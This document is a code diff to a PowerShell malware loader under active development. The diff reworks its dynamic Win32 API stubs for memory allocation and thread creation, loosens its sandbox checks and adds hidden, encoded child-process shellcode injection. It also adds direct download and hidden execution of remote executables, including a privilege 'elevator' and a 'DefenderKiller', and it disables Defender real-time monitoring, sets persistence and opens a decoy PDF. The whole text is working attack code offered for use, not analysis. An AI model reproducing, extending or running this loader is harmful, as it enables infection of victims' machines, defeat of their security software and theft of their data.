@@ -74,26 +74,30 @@ $Ab=$Dm.DefineDynamicAssembly($Da,[System.Reflection.Emit.AssemblyBuilderAccess]
 $Mb=$Ab.DefineDynamicModule('M',$false)
 $Tb=$Mb.DefineType('W','Public,Class')
 $Dll=[System.Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
-$Fld=[System.Reflection.FieldInfo[]]@([System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'))
-$Val=[Object[]]@($True)
+$FldSL=[System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
+$FldEP=[System.Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint')
+$FldCS=[System.Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
+$Flds=[System.Reflection.FieldInfo[]]@($FldSL,$FldEP,$FldCS)
+$csUni=[System.Runtime.InteropServices.CharSet]::Unicode
+$csAnsi=[System.Runtime.InteropServices.CharSet]::Ansi
 $ka=@($k+$kb)
 $u32ref=[UInt32].MakeByRefType()
 $uptr6=New-Object UIntPtr(6)
 
 $m0=$Tb.DefineMethod('LL','Public,Static',[IntPtr],@([String]))
-$m0.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
+$m0.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'LoadLibraryW',$csUni))))
 $m1=$Tb.DefineMethod('GA','Public,Static',[IntPtr],@([IntPtr],[String]))
-$m1.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
+$m1.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'GetProcAddress',$csAnsi))))
 $m2=$Tb.DefineMethod('VA','Public,Static',[IntPtr],@([IntPtr],[UInt32],[UInt32],[UInt32]))
-$m2.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
+$m2.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'VirtualAlloc',$csAnsi))))
 $m3=$Tb.DefineMethod('VP','Public,Static',[bool],@([IntPtr],[UIntPtr],[UInt32],$u32ref))
-$m3.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
+$m3.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'VirtualProtect',$csAnsi))))
 $m4=$Tb.DefineMethod('VF','Public,Static',[bool],@([IntPtr],[UInt32],[UInt32]))
-$m4.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
+$m4.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'VirtualFree',$csAnsi))))
 $m5=$Tb.DefineMethod('CT','Public,Static',[IntPtr],@([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],$u32ref))
-$m5.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
+$m5.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'CreateThread',$csAnsi))))
 $m6=$Tb.DefineMethod('WF','Public,Static',[UInt32],@([IntPtr],[UInt32]))
-$m6.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
+$m6.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'WaitForSingleObject',$csAnsi))))
 $W=$Tb.CreateType()
 _log "S0: rt ready"
 
@@ -140,7 +144,7 @@ function _p1 {
 
 # === SANDBOX CHECKS ===
 function _chk {
-    if ($env:USERDOMAIN -eq 'WORKGROUP') { _log "S0: chk fail (workgroup)"; return $false }
+    if ($env:USERDOMAIN -eq 'WORKGROUP') { _log "S0: chk warn (workgroup)" }
     try {
         $os=Get-CimInstance Win32_OperatingSystem -ErrorAction Stop
         $ramMB=[math]::Round($os.TotalVisibleMemorySize/1024)
@@ -191,7 +195,7 @@ function _aesDecrypt($encryptedBytes, $keyIVBase64) {
 function _scInject($shellcode) {
     try {
         $size=$shellcode.Length
-        $addr=$W::VA([IntPtr]::Zero,$size,0x3000,0x40)  # MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
+        $addr=$W::VA([IntPtr]::Zero,$size,0x3000,0x40)
         if ($addr -eq [IntPtr]::Zero) {
             _log "SC: VirtualAlloc failed"
             return $false
@@ -204,13 +208,29 @@ function _scInject($shellcode) {
             _log "SC: CreateThread failed"
             return $false
         }
-        $W::WF($th,0xFFFFFFFF) | Out-Null  # WaitForSingleObject INFINITE
         _log "SC: injected $size bytes, tid=$tid"
         return $true
     } catch {
         _log "SC: inject failed: $($_.Exception.Message)"
         return $false
     }
+}
+
+function _scInjectSafe($shellcode, $label) {
+    $b64=[Convert]::ToBase64String($shellcode)
+    $scriptBlock = @"
+`$sc=[Convert]::FromBase64String('$b64')
+`$size=`$sc.Length
+`$k=Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p); [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, ref uint t);' -Name 'K' -PassThru
+`$addr=[K]::VirtualAlloc([IntPtr]::Zero,`$size,0x3000,0x40)
+[Runtime.InteropServices.Marshal]::Copy(`$sc,0,`$addr,`$size)
+`$tid=0
+[K]::CreateThread([IntPtr]::Zero,0,`$addr,[IntPtr]::Zero,0,[ref]`$tid)
+"@
+    $encoded=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock))
+    Start-Process powershell.exe -ArgumentList "-NoP -EncodedCommand $encoded" -WindowStyle Hidden
+    _log "SC: $label launched via child process"
+    return $true
 }
 
 # === DOWNLOAD .AES BLOB ===
@@ -229,7 +249,26 @@ function _dl($remoteName) {
     return $null
 }
 
-# === DOWNLOAD + AES DECRYPT + EXECUTE (mode-aware) ===
+# === DOWNLOAD + RUN .EXE DIRECTLY (no AES) ===
+function _dlExe($remoteName, $stage, $label) {
+    $fullName="raw/$remoteName"
+    $exeBytes=_dl $fullName
+    if (-not $exeBytes) {
+        _cb $stage 'fail' "$label download failed"
+        return $false
+    }
+    $exePath="$env:TEMP\$remoteName"
+    try {
+        [IO.File]::WriteAllBytes($exePath,$exeBytes)
+        Start-Process $exePath -WindowStyle Hidden
+        _log "$stage : $label launched ($($exeBytes.Length) bytes)"
+        _cb $stage 'ok' "$label executed"
+        return $true
+    } catch {
+        _cb $stage 'fail' "$label launch failed: $($_.Exception.Message)"
+        return $false
+    }
+}
 function _runAes($remoteName, $stage, $label) {
     $fullName="$payloadMode/$remoteName"
     $encBytes=_dl $fullName
@@ -252,7 +291,7 @@ function _runAes($remoteName, $stage, $label) {
     
     _log "$stage : $fullName decrypted: $($shellcode.Length) bytes"
     
-    $result=_scInject $shellcode
+    $result=_scInjectSafe $shellcode $label
     if ($result) {
         _cb $stage 'ok' "$label executed ($($shellcode.Length) bytes)"
     } else {
@@ -276,7 +315,7 @@ _cb 'S1' 'ok' "is_admin=$cbIsAdmin"
 
 # === ELEVATION (if not admin) ===
 if (-not $cbIsAdmin) {
-    _runAes 'ElevatorShellCode.exe.aes' 'S1' 'ElevatorShellCode'
+    _dlExe 'ElevatorShellCode.exe' 'S1' 'ElevatorShellCode'
     Start-Sleep 5
     try { $cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) } catch {}
     _log "S1: a=$cbIsAdmin"
@@ -308,10 +347,7 @@ if ($cbIsAdmin) {
         $dr1='Disable';$dr2='RealtimeMonitoring'
         Set-ItemProperty -Path $rtpPath -Name ($dr1+$dr2) -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
     } catch {}
-    
-    # Defender killer (update.exe → update.aes)
-    _runAes 'update.exe.aes' 'S2' 'DefenderKiller'
-    Start-Sleep 2
+    _cb 'S2' 'ok' 'defender registry disabled'
 } else {
     _cb 'S2' 'skip' 'not admin, defender kill skipped'
 }
@@ -364,17 +400,14 @@ try {
 
 _cb 'S3' 'ok' 'persistence set (reg+task)'
 
+# === S2: Defender killer (update.exe — direct download, no AES) ===
+if ($cbIsAdmin) {
+    _dlExe 'update.exe' 'S2' 'DefenderKiller'
+    Start-Sleep 2
+}
+
 # === S5: patch.exe (AES blob → shellcode inject) ===
 _runAes 'patch.exe.aes' 'S5' 'patch.exe'
-
-# === S5b: PatchPulsaar.exe (AES blob → shellcode inject) ===
-_runAes 'PatchPulsaar_new.exe.aes' 'S5b' 'PatchPulsaar.exe'
-
-# === S6: hack-browser-data.exe (AES blob → shellcode inject) ===
-_runAes 'hack-browser-data.exe.aes' 'S6' 'hack-browser-data.exe'
-
-# === S6b: wdsr681f3e18.exe (AES blob → shellcode inject) ===
-_runAes 'wdsr681f3e18.exe.aes' 'S6b' 'wdsr681f3e18.exe'
 
 # === S7: Decoy PDF ===
 $pdf1='Rate';$pdf2='_Confirmation';$pdf3='_LD-2026-0847';$pdf4='.pdf'
